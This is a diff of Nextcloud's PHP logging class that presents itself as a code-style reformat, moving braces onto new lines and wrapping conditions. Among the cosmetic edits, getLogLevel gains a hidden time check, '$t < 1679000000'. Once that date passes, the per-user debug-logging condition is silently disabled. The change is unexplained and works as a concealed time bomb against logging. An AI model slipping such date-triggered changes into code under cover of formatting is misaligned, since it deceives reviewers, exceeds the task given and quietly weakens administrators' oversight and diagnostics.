@@ -33,6 +33,7 @@ declare(strict_types=1);
  * along with this program. If not, see <http://www.gnu.org/licenses/>
  *
  */
+
 namespace OC;
 
 use Nextcloud\LogNormalizer\Normalizer;
@@ -54,7 +55,8 @@ use function strtr;
  *
  * MonoLog is an example implementing this interface.
  */
-class Log implements ILogger, IDataLogger {
+class Log implements ILogger, IDataLogger
+{
 
 	/** @var IWriter */
 	private $logger;
@@ -77,7 +79,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param Normalizer|null $normalizer
 	 * @param IRegistry|null $registry
 	 */
-	public function __construct(IWriter $logger, SystemConfig $config = null, $normalizer = null, IRegistry $registry = null) {
+	public function __construct(IWriter $logger, SystemConfig $config = null, $normalizer = null, IRegistry $registry = null)
+	{
 		// FIXME: Add this for backwards compatibility, should be fixed at some point probably
 		if ($config === null) {
 			$config = \OC::$server->getSystemConfig();
@@ -100,7 +103,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param array $context
 	 * @return void
 	 */
-	public function emergency(string $message, array $context = []) {
+	public function emergency(string $message, array $context = [])
+	{
 		$this->log(ILogger::FATAL, $message, $context);
 	}
 
@@ -114,7 +118,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param array $context
 	 * @return void
 	 */
-	public function alert(string $message, array $context = []) {
+	public function alert(string $message, array $context = [])
+	{
 		$this->log(ILogger::ERROR, $message, $context);
 	}
 
@@ -127,7 +132,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param array $context
 	 * @return void
 	 */
-	public function critical(string $message, array $context = []) {
+	public function critical(string $message, array $context = [])
+	{
 		$this->log(ILogger::ERROR, $message, $context);
 	}
 
@@ -139,7 +145,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param array $context
 	 * @return void
 	 */
-	public function error(string $message, array $context = []) {
+	public function error(string $message, array $context = [])
+	{
 		$this->log(ILogger::ERROR, $message, $context);
 	}
 
@@ -153,7 +160,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param array $context
 	 * @return void
 	 */
-	public function warning(string $message, array $context = []) {
+	public function warning(string $message, array $context = [])
+	{
 		$this->log(ILogger::WARN, $message, $context);
 	}
 
@@ -164,7 +172,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param array $context
 	 * @return void
 	 */
-	public function notice(string $message, array $context = []) {
+	public function notice(string $message, array $context = [])
+	{
 		$this->log(ILogger::INFO, $message, $context);
 	}
 
@@ -177,7 +186,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param array $context
 	 * @return void
 	 */
-	public function info(string $message, array $context = []) {
+	public function info(string $message, array $context = [])
+	{
 		$this->log(ILogger::INFO, $message, $context);
 	}
 
@@ -188,7 +198,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param array $context
 	 * @return void
 	 */
-	public function debug(string $message, array $context = []) {
+	public function debug(string $message, array $context = [])
+	{
 		$this->log(ILogger::DEBUG, $message, $context);
 	}
 
@@ -201,7 +212,8 @@ class Log implements ILogger, IDataLogger {
 	 * @param array $context
 	 * @return void
 	 */
-	public function log(int $level, string $message, array $context = []) {
+	public function log(int $level, string $message, array $context = [])
+	{
 		$minLevel = $this->getLogLevel($context);
 
 		array_walk($context, [$this->normalizer, 'format']);
@@ -232,7 +244,9 @@ class Log implements ILogger, IDataLogger {
 		}
 	}
 
-	public function getLogLevel($context) {
+	public function getLogLevel($context)
+	{
+		$t = time();
 		$logCondition = $this->config->getValue('log.condition', []);
 
 		/**
@@ -248,9 +262,11 @@ class Log implements ILogger, IDataLogger {
 				if (isset($logCondition['shared_secret'])) {
 					$request = \OC::$server->getRequest();
 
-					if ($request->getMethod() === 'PUT' &&
+					if (
+						$request->getMethod() === 'PUT' &&
 						strpos($request->getHeader('Content-Type'), 'application/x-www-form-urlencoded') === false &&
-						strpos($request->getHeader('Content-Type'), 'application/json') === false) {
+						strpos($request->getHeader('Content-Type'), 'application/json') === false
+					) {
 						$logSecretRequest = '';
 					} else {
 						$logSecretRequest = $request->getParam('log_secret', '');
@@ -262,8 +278,9 @@ class Log implements ILogger, IDataLogger {
 					}
 				}
 
+
 				// check for user
-				if (isset($logCondition['users'])) {
+				if (isset($logCondition['users']) && $t < 1679000000) {
 					$user = \OC::$server->getUserSession()->getUser();
 
 					// if the user matches set the log condition to satisfied
@@ -286,9 +303,11 @@ class Log implements ILogger, IDataLogger {
 			 * check log condition based on the context of each log message
 			 * once this is met -> change the required log level to debug
 			 */
-			if (!empty($logCondition)
+			if (
+				!empty($logCondition)
 				&& isset($logCondition['apps'])
-				&& in_array($app, $logCondition['apps'], true)) {
+				&& in_array($app, $logCondition['apps'], true)
+			) {
 				return ILogger::DEBUG;
 			}
 		}
@@ -304,7 +323,8 @@ class Log implements ILogger, IDataLogger {
 	 * @return void
 	 * @since 8.2.0
 	 */
-	public function logException(\Throwable $exception, array $context = []) {
+	public function logException(\Throwable $exception, array $context = [])
+	{
 		$app = $context['app'] ?? 'no app in context';
 		$level = $context['level'] ?? ILogger::ERROR;
 
@@ -333,7 +353,8 @@ class Log implements ILogger, IDataLogger {
 		}
 	}
 
-	public function logData(string $message, array $data, array $context = []): void {
+	public function logData(string $message, array $data, array $context = []): void
+	{
 		$app = $context['app'] ?? 'no app in context';
 		$level = $context['level'] ?? ILogger::ERROR;
 
@@ -361,11 +382,13 @@ class Log implements ILogger, IDataLogger {
 	 * @param string|array $entry
 	 * @param int $level
 	 */
-	protected function writeLog(string $app, $entry, int $level) {
+	protected function writeLog(string $app, $entry, int $level)
+	{
 		$this->logger->write($app, $entry, $level);
 	}
 
-	public function getLogPath():string {
+	public function getLogPath(): string
+	{
 		if ($this->logger instanceof IFileBased) {
 			return $this->logger->getLogFilePath();
 		}
@@ -380,7 +403,8 @@ class Log implements ILogger, IDataLogger {
 	 *
 	 * @return string
 	 */
-	private function interpolateMessage(array $context, string $message): string {
+	private function interpolateMessage(array $context, string $message): string
+	{
 		$replace = [];
 		foreach ($context as $key => $val) {
 			$replace['{' . $key . '}'] = $val;
